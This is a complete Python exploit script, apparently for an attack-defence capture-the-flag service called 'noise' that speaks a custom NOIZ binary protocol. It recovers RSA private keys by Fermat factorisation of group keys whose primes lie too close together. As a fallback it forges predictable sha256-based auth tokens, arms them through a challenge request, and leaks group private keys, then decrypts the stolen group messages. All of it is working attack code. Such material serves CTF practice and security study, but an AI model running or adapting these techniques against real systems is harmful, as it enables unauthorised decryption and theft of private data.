#!/usr/bin/env python3
"""noise exploit  --  usage: ./codex_solve.py <ip> <flag_id> [port]

Primary path (read-only, 3 round-trips, no registration, no user listing):
  crypto.generate_group_keypair() picks q=randprime(...) then p=nextprime(q+rand(2**20)),
  so |p-q| < 2**20 and the group modulus falls to Fermat in one step. Recover the
  group's RSA private key offline from its *public* key, use it to answer
  GROUP_CHALLENGE honestly, then read and decrypt GROUP_MESSAGES.

Fallback (if the group keygen was patched) -- the auth chain:
  1. make_token() = "<kind>:<id>:" + sha256("noise-token-<kind>-<id>")[:16], all public.
  2. get_token_subject() only checks `token in auth_cache`; CHALLENGE inserts a token
     for any pubkey, so asking for a challenge arms a forged one.
  3. LIST_GROUPS then hands back GroupSecret rows, i.e. the group private key.
"""
import base64, hashlib, socket, struct, sys
from math import isqrt
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers

HOST, FID = sys.argv[1], sys.argv[2]
# confirmed on the vulnbox: noise-noise-1 -> 0.0.0.0:6426->6426/tcp, binary server
PORTS = [int(sys.argv[3])] if len(sys.argv) > 3 else [6426]
OAEP = padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None)
HDR = struct.Struct("!4sBBBI")                      # magic, version, flags, opcode, len
LIST_USERS, CHALLENGE, GROUP_CHALLENGE, LIST_GROUPS, GROUP_MSGS, ALL_GROUPS = 2, 3, 7, 9, 11, 12
sock = None


class R:
    """Reader for the NOIZ codec: u32 ints and u32-length-prefixed utf-8."""

    def __init__(self, b): self.b, self.i = b, 0
    def u32(self): self.i += 4; return struct.unpack_from("!I", self.b, self.i - 4)[0]
    def s(self): n = self.u32(); self.i += n; return self.b[self.i - n:self.i].decode()


def rx(n):
    b = b""
    while len(b) < n:
        c = sock.recv(n - len(b))
        if not c: raise ConnectionError("peer closed after %d/%d bytes" % (len(b), n))
        b += c
    return b


def call(op, *fields):
    """int field -> bare u32 (ids), bytes field -> u32 length prefix + body."""
    p = b"".join(struct.pack("!I", f) if isinstance(f, int) else struct.pack("!I", len(f)) + f
                 for f in fields)
    sock.sendall(HDR.pack(b"NOIZ", 1, 0, op, len(p)) + p)
    h = rx(HDR.size)
    magic, ver, flags, _, n = HDR.unpack(h)
    if magic != b"NOIZ" or ver != 1:                # never trust an unvalidated header
        sock.settimeout(2)
        try: extra = sock.recv(128)
        except OSError: extra = b""
        raise RuntimeError("not a NOIZ endpoint: %r" % (h + extra)[:96])
    if n > 1 << 20: raise RuntimeError("bogus frame length %d" % n)
    r = R(rx(n))
    if flags == 2: raise RuntimeError("op %d rejected: %r" % (op, r.b[2:]))
    return r


def tok(kind, i):                                   # bug: "auth" is a public sha256
    return "%s:%d:%s" % (kind, i, hashlib.sha256(b"noise-token-%s-%d" % (kind.encode(), i)).hexdigest()[:16])


def fermat(pub64):
    """Group keys have |p-q| < 2**20, so n splits on the first trial square."""
    n = serialization.load_der_public_key(base64.urlsafe_b64decode(pub64)).public_numbers().n
    a = isqrt(n)
    a += a * a < n
    for _ in range(1 << 12):          # weak keys split on iteration 1; cap the giveup
        b = isqrt(a * a - n)
        if b * b == a * a - n:
            p, q, e = a + b, a - b, 65537
            d = pow(e, -1, (p - 1) * (q - 1))
            return RSAPrivateNumbers(p, q, d, d % (p - 1), d % (q - 1), pow(q, -1, p),
                                     RSAPublicNumbers(e, n)).private_key()
        a += 1
    return None


def dump(key, gid, gtok):
    """Read a group's messages and decrypt them with its private key."""
    got = 0
    m = call(GROUP_MSGS, gtok.encode())
    for _ in range(m.u32()):
        m.u32(); m.s(); m.s()
        try:
            print(key.decrypt(base64.urlsafe_b64decode(m.s()), OAEP).decode()); got += 1
        except Exception:
            pass
    return got


# --- connect: keep whichever port actually speaks NOIZ -----------------------

errs = []
for _p in PORTS:
    try:
        sock = socket.create_connection((HOST, _p), timeout=15)
        r = call(ALL_GROUPS)                        # small: ~1 group per tick
        break
    except Exception as e:
        errs.append("  %d: %s" % (_p, e))
        if sock:
            try: sock.close()
            except OSError: pass
        sock = None
else:
    sys.exit("no NOIZ endpoint on %s\n%s" % (HOST, "\n".join(errs)))

groups = [(r.u32(), r.s(), r.s(), r.u32()) for _ in range(r.u32())]   # id, name, pub, owner
sel = [g for g in groups if FID in (str(g[0]), g[1], g[2])] or groups

# --- path 1: Fermat. Needs nothing but the group's public key. ---------------

got, done = 0, set()
for gid, _n, gpub, _o in sel:
    key = fermat(gpub)
    if key is None: continue
    # One uncooperative group must not end the run: a rejection frame makes call()
    # raise, and a re-keyed group makes the challenge decrypt raise, and without
    # this the fallback path below would never execute. call() consumes the whole
    # frame before raising, so the stream stays aligned and we can keep going --
    # but a dead socket is terminal, so let ConnectionError through.
    try:
        ch = call(GROUP_CHALLENGE, gpub.encode()).s()           # answer it honestly
        got += dump(key, gid, key.decrypt(base64.urlsafe_b64decode(ch), OAEP).decode())
        done.add(gid)
    except ConnectionError:
        raise
    except Exception as e:
        print("gid %s skipped: %s" % (gid, e), file=sys.stderr)

# --- path 2: forge a member's token and let LIST_GROUPS leak the privkey -----

if {g[0] for g in sel} - done:                      # whatever Fermat could not split
    r = call(LIST_USERS)
    users = {}                                                  # uid -> (name, pubkey)
    for _ in range(r.u32()):
        u = (r.u32(), r.s(), r.s()); users[u[0]] = u[1:]

    # A numeric flag_id can mean a group id or a user id, so chase both rather
    # than letting one shadow the other. (uid to impersonate, gids to keep).
    hits = [g for g in groups if FID in (str(g[0]), g[1], g[2])]
    targets = [(g[3], {g[0] for g in hits}) for g in hits if g[3] in users]
    targets += [(u, None) for u in users if FID in (str(u), users[u][0])]
    targets = targets or [(u, None) for u in users]             # last resort: sweep

    for uid, keep in targets:
        try:
            call(CHALLENGE, users[uid][1].encode())             # arms user:<uid>
            r = call(LIST_GROUPS, tok("user", uid).encode())    # leaks group privkeys
        except ConnectionError:
            raise
        except Exception as e:                                  # e.g. make_token patched
            print("uid %s skipped: %s" % (uid, e), file=sys.stderr)
            continue
        for _ in range(r.u32()):
            g = (r.u32(), r.s(), r.s(), r.s())                  # id, name, pub, PRIV
            # read all four fields before any skip, or the reader desynchronises
            if (keep is not None and g[0] not in keep) or g[0] in done: continue
            done.add(g[0])
            try:
                call(GROUP_CHALLENGE, g[2].encode())            # arms group:<gid>
                got += dump(serialization.load_der_private_key(base64.urlsafe_b64decode(g[3]), None),
                            g[0], tok("group", g[0]))
            except ConnectionError:
                raise
            except Exception as e:
                print("gid %s skipped: %s" % (g[0], e), file=sys.stderr)

if not got:
    sys.exit("no group plaintext recovered for flag_id %r (%d groups seen)" % (FID, len(groups)))
